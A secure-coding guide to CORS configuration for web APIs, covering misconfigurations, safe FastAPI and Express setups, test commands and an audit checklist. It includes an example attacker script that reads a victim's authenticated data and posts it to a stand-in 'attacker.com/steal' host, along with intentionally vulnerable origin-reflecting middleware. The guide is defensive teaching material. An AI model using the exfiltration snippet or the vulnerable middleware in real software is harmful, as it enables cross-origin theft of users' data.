# CORS Configuration

Cross-Origin Resource Sharing (CORS) controls which origins can access your API from browsers. Misconfiguration allows unauthorized cross-origin access.

## How CORS Works

1. Browser sends request with `Origin` header
2. Server responds with `Access-Control-Allow-Origin`
3. Browser enforces: if origin not allowed, JavaScript can't read response

```
Request:
GET /api/data HTTP/1.1
Origin: https://app.example.com

Response:
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://app.example.com
```

## The Risk

Permissive CORS allows malicious sites to make authenticated requests:

```javascript
// On attacker.com
fetch('https://api.victim.com/user/data', {
  credentials: 'include'  // Sends victim's cookies
})
.then(r => r.json())
.then(data => {
  // Attacker can read victim's data!
  fetch('https://attacker.com/steal', {body: JSON.stringify(data)})
})
```

## Common Misconfigurations

### 1. Wildcard with Credentials (Invalid but Attempted)

```python
# BROKEN - browsers reject this combination
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true

# Browsers will NOT send cookies when origin is *
```

### 2. Reflecting Origin Without Validation

```python
# VULNERABLE - reflects any origin
@app.middleware("http")
async def cors_middleware(request, call_next):
    response = await call_next(request)
    origin = request.headers.get("origin")
    response.headers["Access-Control-Allow-Origin"] = origin  # Dangerous!
    response.headers["Access-Control-Allow-Credentials"] = "true"
    return response

# Attacker's origin is reflected, enabling credential theft
```

### 3. Regex Bypass

```python
# VULNERABLE - regex can be bypassed
ORIGIN_PATTERN = r"https://.*\.example\.com"

# Bypasses:
# https://evil.example.com.attacker.com  (subdomain of attacker)
# https://notexample.com  (if pattern is .*example\.com)
```

### 4. Null Origin Allowed

```python
# VULNERABLE - allows null origin
if origin == "null" or origin in ALLOWED_ORIGINS:
    # null origin can come from:
    # - sandboxed iframes
    # - file:// URLs
    # - data: URLs
    # Attacker can craft page with null origin
```

## Secure Configuration

### FastAPI with Allowlist

```python
from fastapi import FastAPI
from fastapi.middleware.cors import CORSMiddleware

app = FastAPI()

# Explicit origin allowlist
ALLOWED_ORIGINS = [
    "https://app.example.com",
    "https://admin.example.com",
]

# Development only - never in production
if settings.DEBUG:
    ALLOWED_ORIGINS.append("http://localhost:3000")

app.add_middleware(
    CORSMiddleware,
    allow_origins=ALLOWED_ORIGINS,  # Explicit list, not ["*"]
    allow_credentials=True,
    allow_methods=["GET", "POST", "PUT", "DELETE"],
    allow_headers=["Authorization", "Content-Type"],
    max_age=3600,  # Preflight cache duration
)
```

### Dynamic Origin Validation

When you need pattern-based validation (e.g., multi-tenant):

```python
import re
from urllib.parse import urlparse

def is_origin_allowed(origin: str) -> bool:
    """Validate origin against strict rules."""
    if not origin:
        return False

    try:
        parsed = urlparse(origin)
    except Exception:
        return False

    # Must be HTTPS in production
    if parsed.scheme != "https":
        return False

    hostname = parsed.hostname
    if not hostname:
        return False

    # Exact match for known origins
    EXACT_ORIGINS = {"app.example.com", "admin.example.com"}
    if hostname in EXACT_ORIGINS:
        return True

    # Subdomain pattern with strict validation
    # Only allow *.customers.example.com
    if hostname.endswith(".customers.example.com"):
        # Extract subdomain
        subdomain = hostname[:-len(".customers.example.com")]
        # Validate subdomain is safe (alphanumeric + hyphens)
        if re.match(r"^[a-z0-9-]+$", subdomain):
            return True

    return False

# Custom middleware for dynamic validation
@app.middleware("http")
async def dynamic_cors(request, call_next):
    origin = request.headers.get("origin")

    # Handle preflight
    if request.method == "OPTIONS":
        if origin and is_origin_allowed(origin):
            return Response(
                status_code=204,
                headers={
                    "Access-Control-Allow-Origin": origin,
                    "Access-Control-Allow-Credentials": "true",
                    "Access-Control-Allow-Methods": "GET, POST, PUT, DELETE",
                    "Access-Control-Allow-Headers": "Authorization, Content-Type",
                    "Access-Control-Max-Age": "3600",
                }
            )
        return Response(status_code=403)

    response = await call_next(request)

    if origin and is_origin_allowed(origin):
        response.headers["Access-Control-Allow-Origin"] = origin
        response.headers["Access-Control-Allow-Credentials"] = "true"
        response.headers["Vary"] = "Origin"  # Important for caching

    return response
```

### Express.js

```javascript
const cors = require('cors');

// Static allowlist
const allowedOrigins = [
  'https://app.example.com',
  'https://admin.example.com'
];

app.use(cors({
  origin: (origin, callback) => {
    // Allow requests with no origin (mobile apps, curl)
    // Only if your API doesn't need origin enforcement
    if (!origin) return callback(null, true);

    if (allowedOrigins.includes(origin)) {
      callback(null, origin);
    } else {
      callback(new Error('Not allowed by CORS'));
    }
  },
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE'],
  allowedHeaders: ['Authorization', 'Content-Type'],
  maxAge: 3600
}));
```

## Headers Reference

| Header | Purpose | Example |
|--------|---------|---------|
| `Access-Control-Allow-Origin` | Allowed origin | `https://app.example.com` or `*` |
| `Access-Control-Allow-Credentials` | Allow cookies/auth | `true` |
| `Access-Control-Allow-Methods` | Allowed HTTP methods | `GET, POST, PUT, DELETE` |
| `Access-Control-Allow-Headers` | Allowed request headers | `Authorization, Content-Type` |
| `Access-Control-Expose-Headers` | Headers JS can read | `X-Custom-Header` |
| `Access-Control-Max-Age` | Preflight cache (seconds) | `3600` |
| `Vary` | Cache key includes Origin | `Origin` |

## Preflight Requests

Browser sends OPTIONS request for "complex" requests:
- Methods other than GET, HEAD, POST
- Headers other than Accept, Content-Type (form data), etc.
- Content-Type other than `application/x-www-form-urlencoded`, `multipart/form-data`, `text/plain`

```python
@app.options("/{path:path}")
async def preflight(request: Request):
    origin = request.headers.get("origin")

    if not origin or not is_origin_allowed(origin):
        return Response(status_code=403)

    return Response(
        status_code=204,
        headers={
            "Access-Control-Allow-Origin": origin,
            "Access-Control-Allow-Methods": "GET, POST, PUT, DELETE, OPTIONS",
            "Access-Control-Allow-Headers": "Authorization, Content-Type",
            "Access-Control-Max-Age": "3600",
            "Access-Control-Allow-Credentials": "true",
        }
    )
```

## When to Use Wildcard

`Access-Control-Allow-Origin: *` is safe **only** when:
- API is fully public (no authentication)
- No cookies or credentials sent
- Data is not sensitive

```python
# Public API - wildcard OK
@app.get("/public/status")
async def public_status():
    return {"status": "ok"}

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],  # OK for public endpoints
    allow_credentials=False,  # Must be false with wildcard
)
```

## Testing CORS

```bash
# Test preflight
curl -X OPTIONS https://api.example.com/data \
  -H "Origin: https://attacker.com" \
  -H "Access-Control-Request-Method: POST" \
  -v

# Check if arbitrary origin is reflected
curl https://api.example.com/data \
  -H "Origin: https://attacker.com" \
  -v | grep -i access-control

# Test null origin
curl https://api.example.com/data \
  -H "Origin: null" \
  -v | grep -i access-control
```

```python
import pytest

@pytest.mark.parametrize("origin", [
    "https://attacker.com",
    "https://evil.example.com",
    "null",
    "https://app.example.com.attacker.com",
])
def test_cors_rejects_bad_origins(client, origin):
    response = client.options(
        "/api/data",
        headers={"Origin": origin, "Access-Control-Request-Method": "GET"}
    )
    # Should not reflect the origin
    assert response.headers.get("Access-Control-Allow-Origin") != origin

def test_cors_allows_good_origin(client):
    response = client.options(
        "/api/data",
        headers={
            "Origin": "https://app.example.com",
            "Access-Control-Request-Method": "GET"
        }
    )
    assert response.headers.get("Access-Control-Allow-Origin") == "https://app.example.com"
```

## Audit Checklist

- [ ] Is `allow_origins=["*"]` avoided for authenticated endpoints?
- [ ] Is origin reflection avoided (or properly validated)?
- [ ] Is null origin rejected?
- [ ] Are origin patterns strictly validated (no regex bypasses)?
- [ ] Is `Vary: Origin` set for caching correctness?
- [ ] Are preflight responses cached appropriately?
- [ ] Is HTTPS enforced for allowed origins?

## References

- MDN CORS documentation
- OWASP CORS misconfiguration
- PortSwigger CORS research
